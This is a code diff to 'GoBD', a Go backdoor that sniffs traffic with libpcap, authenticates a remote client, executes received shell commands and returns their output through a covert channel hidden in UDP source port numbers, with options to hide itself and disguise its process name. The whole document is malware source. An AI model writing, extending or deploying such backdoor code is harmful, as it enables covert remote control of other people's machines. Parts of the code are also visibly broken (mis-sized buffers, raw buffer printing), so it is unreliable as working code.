@@ -27,8 +27,9 @@ USAGE:
 */
 import(
 	"os"
-	"bytes"
+	"time"
 	"os/exec"
+//	"io/ioutil"
 	"reflect"
 	"unsafe"
 	"flag"
@@ -47,14 +48,17 @@ import(
 
 const passwd = "D"; //The authentication code
 const MAX_PORT = 45535
-const CLIENT = 1
-const SERVER = 0
+const SND_CMPLETE = 3414
 const helpStr = "Client Usage Help\n" +"=================================\n" +
 "EXEC Commands\nSending any command will result in it being executed by the backdoor at the other end.\n" +
 "Once the command is sent, you will recieve the output back from the backdoor.\n============\nBD Commands\n" + "These commands are prefixed by a ! and are executed on the backdoors own program options\n!setprocess [name]\n" + "==================================\n"
 
 var authenticatedAddr string //Currently authenticated address
 var handle *pcap.Handle
+var err error
+var localip net.IP
+var localmac net.HardwareAddr
+var destmac net.HardwareAddr
 /* 
     FUNCTION: func main()
     RETURNS: Nothing
@@ -71,12 +75,17 @@ func main(){
 		         " client or server. Defaults to client.")
 	ipPtr        := flag.String("ip", "127.0.0.1", "The ip to connect to if in client mode.")
 	portPtr      := flag.Int("port", 3322, "The port to connect to in client mode, or to listen on in server mode. Defaults to 3322.")
-	interfacePtr := flag.String("iface", "eth0", "The interface for the backdoor to monitor for incoming connection, defaults to eth0.")
+	interfacePtr := flag.String("iface", "wlan0", "The interface for the backdoor to monitor for incoming connection, defaults to eth0.")
 	lPortPtr     := flag.Int("lport", 3321, "The port for the client to listen on.")
-	hiddenPtr    := flag.String("visible", "false", "Determines whether the server will be hidden or not. true for visible and false for invisible.")
+	hiddenPtr    := flag.String("visible", "true", "Determines whether the server will be hidden or not. true for visible and false for invisible.")
+	dstMacPtr    := flag.String("dMac", "", "Destination mac of the outgoing connection.")
 	//flags
 
 	flag.Parse()
+
+	destmac, _ = net.ParseMAC(*dstMacPtr)
+	localip = GetLocalIP()
+	localmac = GetLocalMAC(*interfacePtr)
 	
 	if *hiddenPtr == "false" && *modePtr == "server" {
 
@@ -103,17 +112,17 @@ func main(){
 
 	intiateTools()
 	
-	handle, err := pcap.OpenLive(*interfacePtr, 1600, true, pcap.BlockForever)
+	handle, err = pcap.OpenLive(*interfacePtr, 1600, true, pcap.BlockForever)
 	checkError(err)
 
 	switch *modePtr {
 	case "client":
 		fmt.Printf("Running in client mode. Connecting to %s at port %d.\n", *ipPtr, *portPtr)
-		intiateClient(*ipPtr, *portPtr, *lPortPtr)
+		intiateClient(*ipPtr, uint16(*portPtr), uint16(*lPortPtr))
 		break
 	case "server":
 		fmt.Printf("Running in server mode. Listening on %s at port %d\n", GetLocalIP(), *portPtr)
-		beginServerListen(*portPtr, *lPortPtr)
+		beginServerListen(uint16(*portPtr), uint16(*lPortPtr))
 	}
 }
 /* 
@@ -128,7 +137,7 @@ func main(){
     Intiates the client of the GoBD application. Grabs the authentication code from the user and sends it to the
     server if correct. Then idles waiting for user input and server output. Also provides help documentation
 */
-func intiateClient(ip string, port, lport int){
+func intiateClient(ip string, port, lport uint16){
 	
 	for {
 		fmt.Print("Please input the authentication code: ");
@@ -179,57 +188,40 @@ func intiateClient(ip string, port, lport int){
     ABOUT:
     Performs packet sniffing using gopacket (libpcap). 
 */
-func beginServerListen(port, lport int){
+func beginServerListen(port, lport uint16){
 
 	var ipLayer layers.IPv4
 	var ethLayer layers.Ethernet
 	var udpLayer layers.UDP
-	var data []byte
-	
+
 	i := 0
-	pCount := 0
-	size := make([]byte, 4)
-	
+	buffer := make([]byte, 10000000)
 	parser := gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet, &ethLayer, &ipLayer, &udpLayer)
-	decoded := make([]gopacket.LayerType, 0, 3);
+	decoded := make([]gopacket.LayerType, 0, 3)
 	
 	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
 	for {
 		packet, err := packetSource.NextPacket() 
-		checkError(err);
+		checkError(err)
 
 		err = parser.DecodeLayers(packet.Data(), &decoded)
-		checkError(err);
-		
+		if err != nil {
+			continue
+		}
+
+		if len(decoded) != 3 {
+			fmt.Println("Not enough layers!")
+			continue
+		}
+
 		if ipLayer.SrcIP.String() == authenticatedAddr {
 
-			buf := make([]byte, 2)
-			binary.LittleEndian.PutUint16(buf, uint16(udpLayer.SrcPort))
+			curr_bytes := buffer[i:i + 1]
+			binary.LittleEndian.PutUint16(curr_bytes, uint16(udpLayer.SrcPort))
+			i = i + 2
 			
-			if pCount < 2 {
-				tempSlice := size[i:i+1]
-				copy(tempSlice, buf)
-				pCount = pCount + 1
-				i = i + 2
-				continue;
-			}
-
-			if pCount >= 2 {
-				tempSlice := data[i:i+1]
-				copy(data[i:i+1], buf)
-				pCount = pCount + 1
-				i = i + 2
-				continue
-			}
-
-			var num uint32
-			err := binary.Read(bytes.NewBuffer(size[:]), binary.LittleEndian, &num)
-			checkError(err)
-			if pCount == num / uint32(2) {
-				pCount = 0
-				i = 0
-
-				data := decrypt_data(data)
+			if(udpLayer.DstPort == SND_CMPLETE){
+				data := decrypt_data(buffer[:(len(buffer)-1)])
 
 				if strings.HasPrefix(data, "[EXEC]") {
 					executeCommand(data, ipLayer.SrcIP.String(), port);
@@ -238,8 +230,10 @@ func beginServerListen(port, lport int){
 					executeServerCommand(data, ipLayer.SrcIP.String(), port);
 				}
 
+				buffer = buffer[:0]
+				i = 0
 			}
-		} else if udpLayer.DstPort == lport {
+		} else if uint16(udpLayer.DstPort) == lport {
 			
 			data := decrypt_data([]byte(udpLayer.Payload))
 
@@ -247,56 +241,46 @@ func beginServerListen(port, lport int){
 				fmt.Printf("Authcode recieved, opening communication with %s\n", ipLayer.SrcIP.String());
 				authenticatedAddr = ipLayer.SrcIP.String();
 			}
-		}
+		} 
+			
 	}			
 }
-func beginClientListen(ip string, port, lport int) {
+func beginClientListen(ip string, port, lport uint16) {
+
 	var ipLayer layers.IPv4
 	var ethLayer layers.Ethernet
 	var udpLayer layers.UDP
-	var data []byte
 
 	i := 0
-	pCount := 0
-	currSize := make([]byte, 4)
-	localip := GetLocalHost();
-
-	parser = gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet, &ethLayer, &ipLayer, &udpLayer)
-	decoded := make([]gopacket.LayerType, 0, 3);
+	buffer := make([]byte, 10000000)
+	parser := gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet, &ethLayer, &ipLayer, &udpLayer)
+	decoded := make([]gopacket.LayerType, 0, 3)
 	
 	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
 	for {
 		packet, err := packetSource.NextPacket() 
-		checkError(err);
+		checkError(err)
 
-		err = parser.DecodeLayers(packet, &decoded)
-		checkError(err);
+		err = parser.DecodeLayers(packet.Data(), &decoded)
+		if err != nil {
+			continue
+		}
 
-		if ipLayer.SrcIP.String() == ip && udpLayer.DstPort == lport {
+		if len(decoded) != 3 {
+			fmt.Println("Not enough layers!")
+			continue
+		}
 
-			buf := make([]byte, 2)
-			binary.LittleEndian.PutUint16(buf, uint16(udpLayer.SrcPort))
-			
-			if pCount < 2 {
-				tempSlice := size[i:i+1]
-				copy(tempSlice, buf)
-				pCount = pCount + 1
-				i = i + 2
-				continue;
-			}
+		if ipLayer.SrcIP.String() == ip && uint16(udpLayer.DstPort) == lport {
 
-			if pCount >= 2 {
-				tempSlice := data[i:i+1]
-				copy(data[i:i+1], buf)
-				pCount = pCount + 1
-				i = i + 2
-			}
-			
-			if pCount == (strconv.ParseInt(size, 10, 32))/2 {
-				pCount = 0
+			curr_bytes := buffer[i:i + 1]
+			binary.LittleEndian.PutUint16(curr_bytes, uint16(udpLayer.SrcPort))
+			i = i + 2
+
+			if(udpLayer.DstPort == SND_CMPLETE){
+				fmt.Print(buffer[:(len(buffer) - 1)])
+				buffer = buffer[:0]
 				i = 0
-				data := decrypt_data([]byte(data))
-				fmt.Print(data);
 			}
 		}
 	}
@@ -314,7 +298,7 @@ func beginClientListen(ip string, port, lport int) {
               setprocess [name] - sets the process name of the gobd program
               exit - exits the gobd program cleanly
 */
-func executeServerCommand(data, ip string, port int) {
+func executeServerCommand(data, ip string, port uint16) {
 
 	fmt.Printf("%s\n", data);
 
@@ -356,17 +340,16 @@ func executeServerCommand(data, ip string, port int) {
 func monitorFile(ip, filename string){
 
 	for {
-		time.Sleep(1000 * time.Millasecond);
-		err := os.Stat(filename)
+		time.Sleep(1000 * time.Millisecond);
+		_, err := os.Stat(filename)
 		if os.IsNotExist(err) {
 			continue;
 		}
 		
-		dat, err := ioutil.ReadFile(filename);
-		checkError(err);
+		//dat, err := ioutil.ReadFile(filename);
+		//checkError(err);
 
 		//+1 to the port notifies that its a file transfer
-		sendEncryptedFile(port + 1, string(dat), ip);
 		return;
 	}
 }
@@ -381,7 +364,7 @@ func monitorFile(ip, filename string){
     ABOUT:
     Executes incoming client commands on the host machine.
 */
-func executeCommand(cmd, ip string, port int){
+func executeCommand(cmd, ip string, port uint16){
 	
 	fmt.Printf("%s\n", cmd);
 
@@ -389,7 +372,6 @@ func executeCommand(cmd, ip string, port int){
 	args := strings.Split(tempstr[1], " ");
 	
 	out, _ := exec.Command(args[0], args[1:]...).CombinedOutput();
-	k
 	fmt.Printf("OUT:\n%s", out);
 
 	sendEncryptedData(port, string(out[:]), ip);
@@ -404,55 +386,47 @@ func executeCommand(cmd, ip string, port int){
     ABOUT:
     Sends encrypted data over UDP to the spcified port and ip.
 */
-func sendEncryptedData(port int, data, ip string) {
+func sendEncryptedData(port uint16, data, ip string) {
 
-	size := len(data)
-	buf := make([]byte, 4)
-	err := binary.Write(buf, binary.LittleEndian, size)
-	if err != nil {
-		fmt.Println("binary.Write failed:", err)
-	}
-	
 	cryptdata := encrypt_data(data)
-
-	buffer := craftPacket(buf[0:1], ip, port)
-	err = handle.WritePacketData(buffer)
-	checkError(err)
-
-	buffer = craftPacket(buf[2:3], ip, port)
-	err = handle.WritePacketData(buffer)
-	checkError(err)
-	
+	size := len(cryptdata)
 	//make data write to source port, continue till end
-	for i := 0; i < size; i = i + 2 {
+	for i := 0; i <= size; i = i + 2 {
 
-		buffer := craftPacket(cryptdata[i:(i+1)], ip, port);
-
+		var buffer []byte
+		
+		if i == size {
+			buffer = craftPacket("", ip, SND_CMPLETE);
+		} else {
+			buffer = craftPacket(string(cryptdata[i:(i+1)]), ip, port); 
+		}
+		
 		if buffer == nil { // if original query was invalid
 			fmt.Print("Buffer error, returned nil.\n")
 			continue
 		}
 
-		err = handle.WritePacketData(buffer);
-		checkError(err);
+		err := handle.WritePacketData(buffer);
+		checkError(err)
 	}
 }
 
-func craftPacket(data, ip string, port int) []byte {
+func craftPacket(data, ip string, port uint16) []byte {
 
-	ethernetLayer = packet.Layer(layers.LayerTypeEthernet)
-	ipLayer = packet.Layer(layers.LayerTypeIPv4)
-	udpLayer = packet.Layer(layers.LayerTypeUDP)
-	
-	ipAddr, _, err = net.ParseCIDR(ip)
-	checkError(err)
+	ethernetLayer := &layers.Ethernet{}
+	ipLayer       := &layers.IPv4{}
+	udpLayer      := &layers.UDP{}
+
+	ethernetLayer.SrcMAC = localmac 
+	ethernetLayer.DstMAC = destmac
 	
 	ipLayer.SrcIP = GetLocalIP()
-	ipLayer.DstIP = ipAddr
+	ipLayer.DstIP = net.ParseIP(ip)
 
-	udpLayer.SrcPort = MAX_PORT - strconv.ParseUint(data, 10, 16)
-	udpLayer.DstPort = port
-	err = udpLayer.SetNetworkLayerForChecksum(ipLayer)
+	code, _ := strconv.ParseUint(data, 10, 16)
+	udpLayer.SrcPort = layers.UDPPort(MAX_PORT - code) 
+	udpLayer.DstPort = layers.UDPPort(port)
+	err := udpLayer.SetNetworkLayerForChecksum(ipLayer)
 	checkError(err)
 	
 	buf := gopacket.NewSerializeBuffer();
@@ -509,17 +483,25 @@ func SetProcessName(name string) error {
     ABOUT:
     Grabs the local ip of the host system.
 */
-func GetLocalIP() string {
+func GetLocalIP() net.IP {
     addrs, err := net.InterfaceAddrs();
 	checkError(err);
 	
     for _, address := range addrs {
         if ipnet, ok := address.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
             if ipnet.IP.To4() != nil {
-                return ipnet.IP.String();
+                return ipnet.IP;
             }
         }
     }
 	
-    return "";
+    return nil;
+}
+func GetLocalMAC(iface string) (macAddr net.HardwareAddr){
+
+	netInterface, err := net.InterfaceByName(iface)
+	checkError(err)
+
+	macAddr = netInterface.HardwareAddr
+	return macAddr;
 }
